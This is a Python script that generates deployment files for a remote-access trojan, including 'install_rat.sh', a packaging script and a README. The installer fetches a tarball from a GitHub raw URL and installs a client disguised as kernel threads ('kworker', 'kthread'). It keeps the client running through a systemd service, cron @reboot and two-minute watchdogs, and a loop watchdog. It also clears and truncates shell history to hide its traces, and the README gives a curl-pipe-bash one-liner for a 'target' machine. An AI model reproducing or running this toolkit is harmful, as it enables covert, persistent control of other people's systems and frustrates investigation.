# -*- coding: utf-8 -*-
from pathlib import Path
import shutil

ROOT = Path(r"A:/000-work/001-project/158-remote-control/102-rat-spark-crossp")
DEPLOY = ROOT / "deploy"
LINUX_SRC = ROOT / "scripts/linux"
KWORKER_REPO = Path(r"A:/001-code/008-kworker")

INSTALL_SH = r'''#!/bin/bash

# ============================================
# kworker + Spark kthread one-click installer (install_rat.sh)
# Original kworker-only installer: install.sh
# Usage:
#   bash -c "$(curl -fsSL https://raw.githubusercontent.com/wondream322/kworker/master/install_rat.sh)"
# Package:
#   https://raw.githubusercontent.com/wondream322/kworker/master/kworker.tar.gz
# ============================================

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

KWORKER_DIR="/var/local/kworker"
KTHREAD_DIR="/var/local/kthreadd"
KTHREAD_BIN="${KTHREAD_DIR}/kthread"
KTHREAD_WATCH="${KTHREAD_DIR}/watch.sh"
SERVICE_NAME="kthread"
WATCH_SERVICE_NAME="kthread-watch"
DOWNLOAD_URL="${DOWNLOAD_URL:-https://raw.githubusercontent.com/wondream322/kworker/master/kworker.tar.gz}"

print_info()    { echo -e "${GREEN}[INFO]${NC} $1"; }
print_warn()    { echo -e "${YELLOW}[WARN]${NC} $1"; }
print_error()   { echo -e "${RED}[ERROR]${NC} $1"; }
print_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }

check_root() {
    if [ "$EUID" -ne 0 ]; then
        print_error "Please run as root"
        exit 1
    fi
}

check_dependencies() {
    print_info "Checking dependencies..."
    if command -v curl >/dev/null 2>&1; then
        print_info "Using curl"
    elif command -v wget >/dev/null 2>&1; then
        print_info "Using wget"
    else
        print_error "curl or wget is required"
        exit 1
    fi
    if ! command -v tar >/dev/null 2>&1; then
        print_error "tar is required"
        exit 1
    fi
    if ! command -v systemctl >/dev/null 2>&1; then
        print_error "systemd (systemctl) is required"
        exit 1
    fi
    print_success "Dependencies OK"
}

create_kworker_directory() {
    print_info "Creating kworker directory: ${KWORKER_DIR}"
    mkdir -p "${KWORKER_DIR}"
    print_success "kworker directory ready"
}

download_and_extract() {
    print_info "Downloading package..."
    cd "${KWORKER_DIR}" || exit 1
    [ -f kworker.tar.gz ] && rm -f kworker.tar.gz

    if command -v curl >/dev/null 2>&1; then
        curl -fsSL "${DOWNLOAD_URL}" -o kworker.tar.gz
    else
        wget -q "${DOWNLOAD_URL}" -O kworker.tar.gz
    fi

    if [ ! -f kworker.tar.gz ]; then
        print_error "Download failed: ${DOWNLOAD_URL}"
        exit 1
    fi
    print_success "Download complete"

    print_info "Extracting..."
    tar -xzf kworker.tar.gz
    print_success "Extract complete"
}

setup_kworker_permissions() {
    print_info "Setting kworker permissions..."
    [ -f "${KWORKER_DIR}/kworker" ] && chmod +x "${KWORKER_DIR}/kworker"
    [ -f "${KWORKER_DIR}/kworker.sh" ] && chmod +x "${KWORKER_DIR}/kworker.sh"
    [ -f "${KWORKER_DIR}/c" ] && chmod 644 "${KWORKER_DIR}/c"
    print_success "kworker permissions set"
}

setup_kthread_directory() {
    print_info "Setting up kthread directory: ${KTHREAD_DIR}"
    mkdir -p "${KTHREAD_DIR}"

    if [ -f "${KWORKER_DIR}/kthread" ]; then
        cp -f "${KWORKER_DIR}/kthread" "${KTHREAD_BIN}"
    else
        print_error "kthread binary not found in package (generate from Web UI first)"
        exit 1
    fi
    chmod 755 "${KTHREAD_BIN}"

    if [ -f "${KWORKER_DIR}/kthread-watch.sh" ]; then
        cp -f "${KWORKER_DIR}/kthread-watch.sh" "${KTHREAD_WATCH}"
    elif [ -f "${KWORKER_DIR}/watch.sh" ]; then
        cp -f "${KWORKER_DIR}/watch.sh" "${KTHREAD_WATCH}"
    else
        cat > "${KTHREAD_WATCH}" <<'WATCH_EOF'
#!/bin/bash
EXE="/var/local/kthreadd/kthread"
while true; do
  if ! pgrep -f "$EXE --service-worker" >/dev/null 2>&1; then
    systemctl restart kthread.service >/dev/null 2>&1 || "$EXE" --service-worker >/dev/null 2>&1 &
  fi
  sleep 15
done
WATCH_EOF
    fi
    chmod 755 "${KTHREAD_WATCH}"
    print_success "kthread directory ready"
}

remove_old_kworker_service() {
    print_info "Removing legacy kworker.service if present..."
    if systemctl list-unit-files kworker.service >/dev/null 2>&1; then
        systemctl stop kworker.service >/dev/null 2>&1 || true
        systemctl disable kworker.service >/dev/null 2>&1 || true
    fi
    [ -f /etc/systemd/system/kworker.service ] && rm -f /etc/systemd/system/kworker.service
    systemctl daemon-reload >/dev/null 2>&1 || true
    print_success "Legacy kworker.service removed"
}

install_kthread_service() {
    print_info "Installing ${SERVICE_NAME}.service..."
    local unit_src=""
    if [ -f "${KWORKER_DIR}/kthread.service" ]; then
        unit_src="${KWORKER_DIR}/kthread.service"
    elif [ -f "${KTHREAD_DIR}/kthread.service" ]; then
        unit_src="${KTHREAD_DIR}/kthread.service"
    else
        print_error "kthread.service not found in package"
        exit 1
    fi
    cp -f "${unit_src}" "/etc/systemd/system/${SERVICE_NAME}.service"
    chmod 644 "/etc/systemd/system/${SERVICE_NAME}.service"
    systemctl daemon-reload
    print_success "kthread.service installed"
}

install_cron_watchdog() {
    print_info "Installing cron watchdog..."
    local cron_file="/etc/cron.d/kthread"
    if [ ! -d /etc/cron.d ]; then
        print_warn "/etc/cron.d not found, skipping cron"
        return 1
    fi
    cat > "${cron_file}" <<CRON_EOF
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

@reboot root ${KTHREAD_BIN} --service-worker >/dev/null 2>&1 &
@reboot root /bin/sh ${KTHREAD_WATCH} >/dev/null 2>&1 &
*/2 * * * * root pgrep -f "${KTHREAD_BIN} --service-worker" >/dev/null 2>&1 || ${KTHREAD_BIN} --service-worker >/dev/null 2>&1 &
CRON_EOF
    chmod 644 "${cron_file}"
    if command -v crond >/dev/null 2>&1; then
        systemctl restart crond >/dev/null 2>&1 || service crond restart >/dev/null 2>&1 || true
    elif command -v cron >/dev/null 2>&1; then
        systemctl restart cron >/dev/null 2>&1 || service cron restart >/dev/null 2>&1 || true
    fi
    print_success "Cron watchdog installed"
    return 0
}

install_watchdog_fallback() {
    print_info "Installing systemd watchdog fallback (${WATCH_SERVICE_NAME}.service)..."
    local watch_unit=""
    if [ -f "${KWORKER_DIR}/kthread-watch.service" ]; then
        watch_unit="${KWORKER_DIR}/kthread-watch.service"
    else
        print_warn "kthread-watch.service not in package, skipping fallback unit"
        return 1
    fi
    cp -f "${watch_unit}" "/etc/systemd/system/${WATCH_SERVICE_NAME}.service"
    chmod 644 "/etc/systemd/system/${WATCH_SERVICE_NAME}.service"
    systemctl daemon-reload
    systemctl enable --now "${WATCH_SERVICE_NAME}.service" >/dev/null 2>&1 || true
    print_success "Watchdog fallback service enabled"
    return 0
}

start_kthread_service() {
    print_info "Starting ${SERVICE_NAME}.service..."
    if ! systemctl enable --now "${SERVICE_NAME}.service"; then
        print_error "Failed to start ${SERVICE_NAME}.service"
        systemctl status "${SERVICE_NAME}.service" --no-pager || true
        exit 1
    fi
    print_success "Service started and enabled"
}

check_status() {
    print_info "Service status:"
    echo ""
    systemctl status "${SERVICE_NAME}.service" --no-pager || true
    echo ""
}

cleanup() {
    print_info "Cleaning up..."
    rm -f "${KWORKER_DIR}/kworker.tar.gz"
    rm -f "${KWORKER_DIR}/kthread.service" "${KWORKER_DIR}/kthread-watch.service" "${KWORKER_DIR}/kthread-watch.sh" 2>/dev/null || true
    history -c 2>/dev/null || true
    if [ -f ~/.bash_history ]; then
        tail -n 20 ~/.bash_history > ~/.bash_history.tmp 2>/dev/null || true
        [ -f ~/.bash_history.tmp ] && mv -f ~/.bash_history.tmp ~/.bash_history
    fi
    print_success "Cleanup complete"
}

show_complete_info() {
    echo ""
    echo "=========================================="
    print_success "Installation complete"
    echo "=========================================="
    echo -e "${GREEN}kworker dir:${NC} ${KWORKER_DIR}"
    echo -e "${GREEN}kthread dir:${NC} ${KTHREAD_DIR}"
    echo -e "${GREEN}service:${NC} ${SERVICE_NAME}.service"
    echo ""
    echo "Commands:"
    echo "  systemctl status ${SERVICE_NAME}.service"
    echo "  systemctl restart ${SERVICE_NAME}.service"
    echo "  journalctl -u ${SERVICE_NAME}.service -f"
    echo "=========================================="
}

error_handler() {
    print_error "Installation failed"
    exit 1
}

main() {
    trap error_handler ERR
    echo ""
    echo "=========================================="
    echo "  kworker + kthread installer"
    echo "=========================================="
    echo ""

    check_root
    check_dependencies
    create_kworker_directory
    download_and_extract
    setup_kworker_permissions
    setup_kthread_directory
    remove_old_kworker_service
    install_kthread_service
    if ! install_cron_watchdog; then
        install_watchdog_fallback || print_warn "No cron and no watchdog unit; relying on systemd Restart=always"
    fi
    start_kthread_service
    check_status
    cleanup
    show_complete_info
}

main "$@"
'''

PACK_SH = r'''#!/bin/bash
# Build kworker.tar.gz for GitHub upload (run on Linux or WSL)
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
KWORKER_SRC="${KWORKER_SRC:-/mnt/a/001-code/008-kworker/kworker}"
KTHREAD_BIN="${KTHREAD_BIN:-${ROOT}/deploy/kthread}"
STAGING="${ROOT}/deploy/.tar-staging"
OUT="${ROOT}/deploy/kworker.tar.gz"

if [ ! -d "${KWORKER_SRC}" ]; then
  echo "[ERROR] kworker source not found: ${KWORKER_SRC}"
  echo "        Set KWORKER_SRC to the kworker/kworker directory"
  exit 1
fi
if [ ! -f "${KWORKER_SRC}/kworker" ]; then
  echo "[ERROR] kworker binary missing in ${KWORKER_SRC}"
  echo "        Place the linux kworker binary there before packing"
  exit 1
fi
if [ ! -f "${KTHREAD_BIN}" ]; then
  echo "[ERROR] kthread client not found: ${KTHREAD_BIN}"
  echo "        1. Start server and open Web UI"
  echo "        2. Generate Linux client (downloads kthread)"
  echo "        3. Copy/rename it to deploy/kthread"
  echo "        built/linux_amd64 is only an empty template and cannot be used"
  exit 1
fi

rm -rf "${STAGING}"
mkdir -p "${STAGING}"

cp -f "${KWORKER_SRC}/kworker" "${STAGING}/"
cp -f "${KWORKER_SRC}/kworker.sh" "${STAGING}/"
cp -f "${KWORKER_SRC}/c" "${STAGING}/"
cp -f "${KWORKER_SRC}/kworker.service" "${STAGING}/" 2>/dev/null || true
cp -f "${ROOT}/deploy/kthread.service" "${STAGING}/"
cp -f "${ROOT}/deploy/kthread-watch.sh" "${STAGING}/"
cp -f "${ROOT}/deploy/kthread-watch.service" "${STAGING}/"
cp -f "${KTHREAD_BIN}" "${STAGING}/kthread"

chmod +x "${STAGING}/kworker" "${STAGING}/kworker.sh" "${STAGING}/kthread"

tar -czf "${OUT}" -C "${STAGING}" .
rm -rf "${STAGING}"

echo "[OK] Created ${OUT}"
tar -tzf "${OUT}"
'''

README_LINUX = """Spark Linux Deploy Assets
=========================

Files in deploy/:
  install_rat.sh          - RAT one-click installer (upload to kworker GitHub repo root)
  kthread.service         - systemd unit for RAT client
  kthread-watch.sh        - loop watchdog script
  kthread-watch.service   - systemd fallback when cron is unavailable
  pack-kworker-tar.sh     - build kworker.tar.gz for GitHub
  kthread                 - Web UI generated client (NOT built/linux_amd64 template)

Prepare kthread (required before pack-kworker-tar.sh):
  1. Start server (run.bat) and open Web UI
  2. Generate Linux client -> download kthread
  3. Save to deploy/kthread
  built/linux_amd64 is a blank template; Web UI injects server config into it.

One-click install on target Linux (root):
  bash -c "$(curl -fsSL https://raw.githubusercontent.com/wondream322/kworker/master/install_rat.sh)"

Local test:
  bash deploy/install_rat.sh

Build kworker.tar.gz (Linux/WSL):
  bash deploy/pack-kworker-tar.sh

Package layout (tar root):
  kworker, kworker.sh, c, kworker.service (legacy, not installed)
  kthread, kthread.service, kthread-watch.sh, kthread-watch.service

After install:
  /var/local/kworker/     - kworker files (permissions only, no kworker.service)
  /var/local/kthreadd/    - kthread binary + watch.sh
  systemctl status kthread.service

Test auto-recovery:
  pkill -f "kthread --service-worker"
  sleep 5
  systemctl status kthread.service
"""


def write_text(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content.replace("\r\n", "\n"), encoding="utf-8")


def main() -> None:
    DEPLOY.mkdir(parents=True, exist_ok=True)

    for name in ["kthread.service", "kthread-watch.sh", "kthread-watch.service"]:
        src = LINUX_SRC / name
        if src.is_file():
            write_text(DEPLOY / name, src.read_text(encoding="utf-8"))

    write_text(DEPLOY / "install_rat.sh", INSTALL_SH)
    if KWORKER_REPO.is_dir():
        write_text(KWORKER_REPO / "install_rat.sh", INSTALL_SH)
    write_text(DEPLOY / "pack-kworker-tar.sh", PACK_SH)
    write_text(DEPLOY / "README-LINUX.txt", README_LINUX)

    kthread = DEPLOY / "kthread"
    if not kthread.is_file():
        print("  [NOTE] deploy/kthread missing - generate from Web UI before packing tar")

    for sh in ["install_rat.sh", "pack-kworker-tar.sh"]:
        p = DEPLOY / sh
        if p.is_file():
            p.chmod(p.stat().st_mode | 0o111)

    print("Generated deploy files:")
    for p in sorted(DEPLOY.iterdir()):
        if p.name.startswith("_") or p.name == "gen_deploy_files.py":
            continue
        print(f"  {p.name} ({p.stat().st_size} bytes)")


if __name__ == "__main__":
    main()